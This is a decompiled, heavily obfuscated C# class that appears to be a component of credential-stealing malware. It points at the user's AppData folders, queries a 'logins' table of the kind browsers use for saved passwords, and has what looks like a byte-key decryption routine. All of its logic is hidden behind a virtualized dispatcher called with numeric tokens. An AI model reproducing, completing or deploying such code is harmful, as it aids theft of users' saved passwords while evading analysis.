using System;
using System.Collections.Generic;

public class GClass1
{
	public static string string_0 = Delegate136.smethod_0(Environment.SpecialFolder.LocalApplicationData);

	public static string string_1 = Delegate136.smethod_0(Environment.SpecialFolder.ApplicationData);

	public static List<GClass3> smethod_0()
	{
		return (List<GClass3>)new GClass22().method_112(null, 859787);
	}

	private static List<GClass3> smethod_1(string string_2, string string_3, string EA270E64 = "logins")
	{
		object[] object_ = new object[3] { string_2, string_3, EA270E64 };
		return (List<GClass3>)new GClass22().method_112(object_, 826531);
	}

	private static List<string> smethod_2(string string_2)
	{
		object[] object_ = new object[1] { string_2 };
		return (List<string>)new GClass22().method_112(object_, 858637);
	}

	public static string smethod_3(byte[] byte_0, byte[] B24492A7)
	{
		object[] object_ = new object[2] { byte_0, B24492A7 };
		return (string)new GClass22().method_112(object_, 700456);
	}

	public static byte[] B996D545(string string_2)
	{
		object[] object_ = new object[1] { string_2 };
		return (byte[])(Array)new GClass22().method_112(object_, 843590);
	}

	public static string smethod_4(string string_2)
	{
		object[] object_ = new object[1] { string_2 };
		return (string)new GClass22().method_112(object_, 704425);
	}
}
